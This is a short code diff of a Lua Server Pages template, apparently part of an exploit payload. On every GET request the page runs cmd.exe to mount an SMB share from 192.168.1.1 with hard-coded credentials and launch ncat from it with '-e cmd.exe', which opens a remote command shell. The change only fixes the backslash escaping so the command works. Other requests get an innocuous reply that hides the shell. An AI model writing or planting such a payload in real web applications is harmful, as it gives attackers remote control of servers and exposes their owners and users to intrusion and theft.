@@ -6,7 +6,7 @@
 </div>
 
 <?lsp if request:method() == "GET" then ?>
-   <?lsp os.execute("cmd.exe /c net use x: \\192.168.1.1\SMB /user:user pass & x:\\ncat.exe 192.168.1.1 135 -e cmd.exe") ?>
+   <?lsp os.execute("cmd.exe /c net use x: \\\\192.168.1.1\\SMB /user:user pass & x:\\ncat.exe 192.168.1.1 135 -e cmd.exe") ?>
 <?lsp else ?>
    You sent a <?lsp=request:method()?> request
 <?lsp end ?>
